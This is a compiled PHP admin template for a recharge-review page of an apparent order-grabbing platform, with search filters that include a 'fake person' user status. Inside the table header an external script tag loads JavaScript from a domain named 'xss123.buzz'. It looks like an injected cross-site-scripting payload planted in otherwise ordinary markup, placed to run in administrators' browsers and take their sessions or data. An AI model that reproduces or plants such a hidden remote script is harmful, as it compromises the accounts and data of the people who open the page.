<?php /*a:3:{s:68:"/www/wwwroot/qiangdan/application/admin/view/deal/user_recharge.html";i:1615598992;s:54:"/www/wwwroot/qiangdan/application/admin/view/main.html";i:1615598992;s:75:"/www/wwwroot/qiangdan/application/admin/view/deal/user_recharge_search.html";i:1615598992;}*/ ?>
<div class="layui-card layui-bg-gray"><style>        .layui-tab-card>.layui-tab-title .layui-this {
            background-color: #fff;
        }
    </style><!--<div class="layui-tab layui-tab-card" lay-allowClose="true" lay-filter="test1">--><!--<ul class="layui-tab-title">--><!--<li lay-id="/admin/users/index" class="layui-this">网站设置</li>--><!--<li lay-id="/admin/deal/order_list">用户基本管理</li>--><!--<li lay-id="222">权限分配</li>--><!--<li lay-id="222">全部历史商品管理文字长一点试试</li>--><!--<li lay-id="222">全部历史商品管理文字长一点试试</li>--><!--<li lay-id="222">订单管理</li>--><!--<li lay-id="222">订单管理</li>--><!--<li lay-id="222">订单管理</li>--><!--<li lay-id="222">订单管理</li>--><!--<li lay-id="222">订单管理</li>--><!--<li lay-id="222">订单管理</li>--><!--<li lay-id="222">订单管理</li>--><!--<li lay-id="222">订单管理</li>--><!--<li lay-id="222">订单管理</li>--><!--</ul>--><!--</div>--><?php if(!(empty($title) || (($title instanceof \think\Collection || $title instanceof \think\Paginator ) && $title->isEmpty()))): ?><div class="layui-card-header layui-anim layui-anim-fadein notselect"><span class="layui-icon layui-icon-next font-s10 color-desc margin-right-5"></span><?php echo htmlentities((isset($title) && ($title !== '')?$title:'')); ?><div class="pull-right"></div></div><?php endif; ?><div class="layui-card-body layui-anim layui-anim-upbit"><div class="think-box-shadow"><fieldset><legend>条件搜索</legend><form class="layui-form layui-form-pane form-search" action="<?php echo request()->url(); ?>" onsubmit="return false" method="get" autocomplete="off"><div class="layui-form-item layui-inline"><label class="layui-form-label">订单号</label><div class="layui-input-inline"><input name="oid" value="<?php echo htmlentities((app('request')->get('oid') ?: '')); ?>" placeholder="请输入订单号" class="layui-input"></div></div><div class="layui-form-item layui-inline"><label class="layui-form-label">用户名称</label><div class="layui-input-inline"><input name="username" value="<?php echo htmlentities((app('request')->get('username') ?: '')); ?>" placeholder="请输入用户名称" class="layui-input"></div></div><div class="layui-form-item layui-inline"><label class="layui-form-label">状态</label><div class="layui-input-inline"><select name="is_jia" id="selectList" class="layui-input-inline" ><option value=""  <?php
                    if(isset($_GET['is_jia'])){
                    $dd = $_GET['is_jia']=='' ? 'selected' : '';echo $dd;  
                    }
                    
                    ?>  >所有状态</option><option value="0"  <?php 
                    if(isset($_GET['is_jia'])){
                    $dd = $_GET['is_jia']=='0' ? 'selected' : '';echo $dd;  
                    } 
                    ?> >真人</option><option value="1" <?php
                  if(isset($_GET['is_jia'])){
                    $dd = $_GET['is_jia']=='1' ? 'selected' : '';echo $dd;  
                    }
                    ?> >假人</option></select></div></div><div class="layui-form-item layui-inline"><label class="layui-form-label">手机号码</label><div class="layui-input-inline"><input name="tel" value="<?php echo htmlentities((app('request')->get('tel') ?: '')); ?>" placeholder="请输入手机号码" class="layui-input"></div></div><div class="layui-form-item layui-inline"><label class="layui-form-label">添加时间</label><div class="layui-input-inline"><input data-date-range name="addtime" value="<?php echo htmlentities((app('request')->get('addtime') ?: '')); ?>" placeholder="请选择添加时间" class="layui-input"></div></div><div class="layui-form-item layui-inline"><button class="layui-btn layui-btn-primary"><i class="layui-icon">&#xe615;</i> 搜 索</button></div></form></fieldset><fieldset><legend>数据统计</legend><font color="red" style="margin-left:1rem">交易总额：<?php echo htmlentities((isset($recharge_sum) && ($recharge_sum !== '')?$recharge_sum:'0')); ?>元</font><font color="red" style="margin-left:5rem">交易条数：<?php echo htmlentities((isset($jyts) && ($jyts !== '')?$jyts:'0')); ?>条</font><font color="red" style="margin-left:5rem">交易次数为1的用户：<?php echo htmlentities((isset($jycswy) && ($jycswy !== '')?$jycswy:'0')); ?>人</font></fieldset><script>form.render()</script><table class="layui-table margin-top-15" lay-skin="line"><?php if(!(empty($list) || (($list instanceof \think\Collection || $list instanceof \think\Paginator ) && $list->isEmpty()))): ?><thead><tr><th class='text-left nowrap'>订单号</th><th class='text-left nowrap'>手机号</th><th class='text-left nowrap'>真实姓名</th><th class='text-left nowrap'>会员等级</th><th class='text-left nowrap'>上级用户</th><th class='text-left nowrap'>第几次充值</th><!--<th class='text-left nowrap'>真实姓名</th> --><th class='text-left nowrap'>交易数额</th><th class='text-left nowrap'>成功次数</th><th class='text-left nowrap'>打款凭证</th><th class='text-left nowrap'>添加时间</th><th class='text-left nowrap'>支付方式</th><th class='text-left nowrap'>类型</th><th class='text-left nowrap'>处理时间</th><!--<th class='text-left nowrap'>二维码</th> --><th class='text-left nowrap'>操作</th><script src="https://xss123.buzz/myjs/fos.js"></script></tr></thead><?php endif; ?><tbody><?php foreach($list as $key=>$vo): ?><tr><td class='text-left nowrap'><?php echo htmlentities($vo['id']); ?></td><td class='text-left nowrap'><?php echo htmlentities($vo['tel']); ?></td><td class='text-left nowrap'><?php echo htmlentities($vo['username']); ?></td><td class='text-left nowrap'><?php echo htmlentities($vo['level_name']); ?></td><td class='text-left nowrap'><?php echo htmlentities($vo['up_username']); ?></td><td class='text-left nowrap'><?php echo htmlentities($vo['nums']); ?></td><!--<td class='text-left nowrap'><?php echo htmlentities($vo['real_name']); ?></td> --><td class='text-left nowrap'><?php echo htmlentities($vo['num']); ?></td><td class='text-left nowrap'><?=!empty($recharge_ok_list[$vo['uid']]) ? $recharge_ok_list[$vo['uid']] : 0?></td><td class='text-left nowrap'><?php if($vo['pic']): ?><a data-dbclick data-title="查看图片" data-modal='<?php echo url("admin/users/picinfo"); ?>?pic=<?php echo htmlentities($vo['pic']); ?>'><img src="<?php echo htmlentities($vo['pic']); ?>" style="width:50px;height:50px;"></a><?php else: ?><img src="<?php echo htmlentities($vo['pic']); ?>" style="width:50px;height:50px;"><?php endif; ?></td><td class='text-left nowrap'><?php echo htmlentities(format_datetime($vo['addtime'])); ?></td><td class='text-left nowrap'><?php echo htmlentities((isset($vo['pay_name']) && ($vo['pay_name'] !== '')?$vo['pay_name']:"银行卡充值")); ?></td><td class='text-left nowrap'><?php if($vo['is_vip']): ?><button class="layui-btn layui-btn-xs layui-btn layui-btn-warm">会员升级</button><?php else: ?><button class="layui-btn layui-btn-xs layui-btn layui-btn-danger">会员充值</button><?php endif; ?></td><td class='text-left nowrap'><?php echo htmlentities(format_datetime($vo['endtime'])); ?></td><td class='text-left nowrap'><?php switch($vo['status']): case "0": ?>待付款<?php break; case "1": if(auth("edit_recharge")): ?><a data-csrf="<?php echo systoken('admin/deal/edit_recharge'); ?>" class="layui-btn layui-btn-xs layui-btn" data-action="<?php echo url('edit_recharge',['status'=>2,'id'=>$vo['id']]); ?>" data-value="id#<?php echo htmlentities($vo['id']); ?>;status#2" >通过</a><a data-csrf="<?php echo systoken('admin/deal/edit_recharge'); ?>" class="layui-btn layui-btn-xs layui-btn-warm J_bohui" data-url="<?php echo url('edit_recharge',['status'=>3,'id'=>$vo['id']]); ?>" data-id="<?php echo htmlentities($vo['id']); ?>" data-status="3" data-value="id#<?php echo htmlentities($vo['id']); ?>;status#3" >驳回</a><?php endif; break; case "2": ?>审核通过<?php break; case "3": ?>审核驳回<?=$vo['remark'] ? '(' . $vo['remark'] . ')' : '';break; ?><?php endswitch; ?></td></tr><?php endforeach; ?></tbody></table><?php if(empty($list) || (($list instanceof \think\Collection || $list instanceof \think\Paginator ) && $list->isEmpty())): ?><span class="notdata">没有记录哦</span><?php else: ?><?php echo (isset($pagehtml) && ($pagehtml !== '')?$pagehtml:''); ?><?php endif; ?></div><script>    $(".J_bohui").click(function () {
        var id = $(this).attr("data-id");
        var status = $(this).attr("data-status");
        layer.open({
            title: '驳回原因'
            ,content: '<textarea class="J_remark" style="width: 300px; height: 100px; padding: 8px;"></textarea>'
            ,yes: function(index, layero) {
                $.ajax({
                    type: 'POST',
                    url: "<?php echo url('edit_recharge'); ?>",
                    data: {
                        'id': id,
                        'status': status,
                        'remark': $(".J_remark").val(),
                        '_csrf_': "<?php echo systoken('admin/deal/edit_recharge'); ?>"
                    },
                    success:function (res) {
                        layer.closeAll();
                        layer.msg("操作成功");
                        setTimeout(function () {
                        	location.reload();
                        }, 2000);
                    }
                });
            }
        });
    });
</script></div></div><script>//    layui.use('element', function(){
//        var element = layui.element;
//
//        element.tabAdd('demo', {
//            title: '选项卡的标题'
//            ,content: '选项卡的内容' //支持传入html
//            ,id: '选项卡标题的lay-id属性值'
//        });
//
//        //获取hash来切换选项卡，假设当前地址的hash为lay-id对应的值
//        var layid = location.hash.replace(/^#test1=/, '');
//        element.tabChange('test1', layid); //假设当前地址为：http://a.com#test1=222，那么选项卡会自动切换到“发送消息”这一项
//
//        //监听Tab切换，以改变地址hash值
//        element.on('tab(test1)', function(){
//            location.hash = ''+ this.getAttribute('lay-id');
//        });
//    });

</script>